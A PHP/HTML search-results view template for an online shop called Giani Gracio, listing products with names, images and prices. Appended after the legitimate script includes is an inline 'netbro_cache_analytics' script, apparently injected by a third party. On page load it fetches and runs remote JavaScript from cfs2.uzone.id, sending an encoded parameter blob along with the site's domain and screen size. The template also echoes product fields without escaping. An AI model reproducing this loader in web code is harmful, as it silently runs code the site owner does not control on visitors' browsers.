
<!doctype html>
<html lang="en">
<head>

	<meta charset="utf-8">
	<!--[if IE]>
		<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
	<![endif]-->
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="">
	<meta name="author" content="">
	
	<title>Giani Gracio | Online Shop</title>
	
	<!-- Bootstrap Core CSS -->
	<link href="<?=base_url()?>assets/css/bootstrap.min.css" rel="stylesheet">
	
	<!-- Google Web Fonts -->
	<link href="https://fonts.googleapis.com/css?family=Roboto+Condensed:400,700italic,700,400italic,300italic,300" rel="stylesheet" type="text/css">
	<link href="https://fonts.googleapis.com/css?family=Abel" rel="stylesheet" type="text/css">
	
	<!-- CSS Files -->
    <link href="http://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css" rel="stylesheet">
	<link href="<?=base_url()?>assets/css/stylecss.css" rel="stylesheet">
	<link href="<?=base_url()?>assets/css/responsive.css" rel="stylesheet">
	
	<!--[if lt IE 9]>
		<script src="js/ie8-responsive-file-warning.js"></script>
	<![endif]-->
	
	<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->
	
	<!-- Fav and touch icons -->
	<link rel="apple-touch-icon-precomposed" sizes="144x144" href="images/fav-144.png">
	<link rel="apple-touch-icon-precomposed" sizes="114x114" href="images/fav-114.png">
	<link rel="apple-touch-icon-precomposed" sizes="72x72" href="images/fav-72.png">
	<link rel="apple-touch-icon-precomposed" href="images/fav-57.png">
	<link rel="shortcut icon" href="<?=base_url()?>assets/img/favicon.png">
	
</head>
<body>

<?php $this->load->view('topheader')?>
<?php
$this->load->model('modeldb');
$data['kategori'] = $this->modeldb->allcategories(); 
$this->load->view('navbar2', $data);
?>
<!-- Main Container Starts -->
	<div class="main-container container">
	<!-- Nested Row Starts -->

		<!-- Primary Content Starts -->

			<!-- Breadcrumb Starts -->
				<ol class="breadcrumb" style="margin-bottom: 30px">
					<li><a href="<?=base_url()?>">Home</a></li>					
					<li class="active">Search Result</li>
				</ol>
			<!-- Breadcrumb Ends -->
			<!-- Product Filter Starts -->
				<!--<div class="product-filter">
					<div class="row">
						<div class="col-md-4">
							<div class="display">
								<a href="category-list.html" class="active">
									<i class="fa fa-th-list" title="List View"></i>
								</a>
								<a href="category-grid.html">
									<i class="fa fa-th" title="Grid View"></i>
								</a>
							</div>
						 </div>
						<div class="col-md-2 text-right">
							<label class="control-label">Sort</label>
						</div>
						<div class="col-md-3 text-right">
							<select class="form-control">
								<option value="default" selected="selected">Default</option>
								<option value="NAZ">Name (A - Z)</option>
								<option value="NZA">Name (Z - A)</option>
							</select>
						</div>
						<div class="col-md-1 text-right">
							<label class="control-label">Show</label>
						</div>
						<div class="col-md-2 text-right">
							<select class="form-control">
								<option value="1">1</option>
								<option value="2">2</option>
								<option value="3" selected="selected">3</option>
							</select>
						</div>
					</div>						 
				</div>-->
			<!-- Product Filter Ends -->
			<!-- Product Grid Display Starts -->
				<div class="row">
				<!-- Product Starts -->
				<?php
					if(count($cari)>0) {
						foreach($cari as $row){ ?>
							<div class="col-md-4 col-sm-6">
								<div class="product-col">
							<div class="image">
								<img src="<?=base_url().'uploads/'.$row->image?>" alt="<?=$row->nama?>" class="img-responsive img-center-sm" />
							</div>
							<div class="caption">
								<h4><a href="<?=base_url().'detail-product/'.$row->barcode?>"><?=$row->nama?></a></h4>
								<div class="description" >
									<!-- <?=$row->deskripsi?> -->
								</div>
								<?php
				                  $x = $this->db->where('barcode', $row->barcode)->get('size');
				                  if ($x->num_rows() > 0){
										$z = $x->row()->price;
									}else{
										return 0;
									}
				                ?>
								<div class="price">
									<span class="price-new">Rp. <?=number_format($z,0,',','.')?>,-</span> 
									<!--<span class="price-old">$249.50</span>-->
								</div>
								<div class="cart-button button-group">
									<button type="button" class="btn btn-wishlist">
										<i class="fa fa-heart"></i>
									</button>
									<a href="<?=base_url().'detail-product/'.$row->barcode?>" class="btn btn-cart">
										<i class="fa fa-shopping-cart"></i>			
										Add to cart
									</a>								
								</div>
							</div>
						</div>
							</div>
				<?php 
						} 
					}else{ 
				?>
						<div class="content-box text-center">
							<h4 class="special-heading">oops !</h4>
							<h5>
								The product you were looking for could not be found.
							</h5>
							<br />
							<p>
								<a href="<?=base_url()?>" class="btn btn-main text-uppercase">Back to Home</a>
							</p>
						</div>

				<?php } ?>
				<!-- Product Ends -->
				</div>
			<!-- Product Grid Display Ends -->

			<!-- Pagination & Results Starts -->
				<div class="row">
				<!-- Pagination Starts -->
					<div class="col-sm-6 pagination-block">
						<?php echo $halaman ?>
					</div>
				<!-- Pagination Ends -->
				<!-- Results Starts -->
					<!--<div class="col-sm-6 results">
						Showing 1 to 3 of 12 (4 Pages)
					</div>-->
				<!-- Results Ends -->
				</div>
			<!-- Pagination & Results Ends -->

		<!-- Primary Content Ends -->
	<!-- Nested Row Ends -->
	</div>
<!-- Main Container Ends -->
<?php
$data['kontak'] = $this->modeldb->setting(); 
$this->load->view('footer2', $data);
?>
<!-- JavaScript Files -->
<script src="<?=base_url()?>assets/js/jquery-1.11.1.min.js"></script>
<script src="<?=base_url()?>assets/js/jquery-migrate-1.2.1.min.js"></script>	
<script src="<?=base_url()?>assets/js/bootstrap.min.js"></script>
<script src="<?=base_url()?>assets/js/bootstrap-hover-dropdown.min.js"></script>
<script src="<?=base_url()?>assets/js/jquery.magnific-popup.min.js"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582H6x5iDAuv2BVACIgr3hsRyvCuufJ0UY0Ry6vOpcfdILgkQH18InGx%2fUcog9Na%2bzvt62XBF0GiTs5cT%2fRnc9yyHNdD3hM7EN1WldthAneOKxH3QabFiBzHqYufa2ileo%2fYGKYMRH4JPlPpPVBpwgIi49o1saFojuiHlvG768iKZxqxOZb76iXcU2FCAJseC1PmhchNfOojdWjoxPe9XFe3ruVa4INas%2bPSak6XVGXxss1%2bs4xvaDy%2bhd%2bfDmAS7TFbNKGr6qk3GI89mhV3s8oMYktPJ2IN6EQxWNonS3SrxH8YbkETOE6bBV6UGdWrRJDSPy6CGIItTIgqA%2bpPPZPXkD5MiL9SsWVi6il8ZVvDOkRK%2b0hiuW%2bGC8D04XiK6dLSacRuprQlQX6jkTuFbEJfB%2fYUpDdQymClFL%2f3NA%2fcbxzwohmluX665NWk8yf6gEPjvKics98gg5TD%2bAgWpbFUysDkQFCgTdJri%2fpza3H3U19tJJ6UUgp6W9j40nnzJwTkgkxqqn9jYkCSDCsgEo0GvYk3L6yhsTfqnCUw5qA2%2bY7jQzhzzZ%2bhuYrAxZncZg5g%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>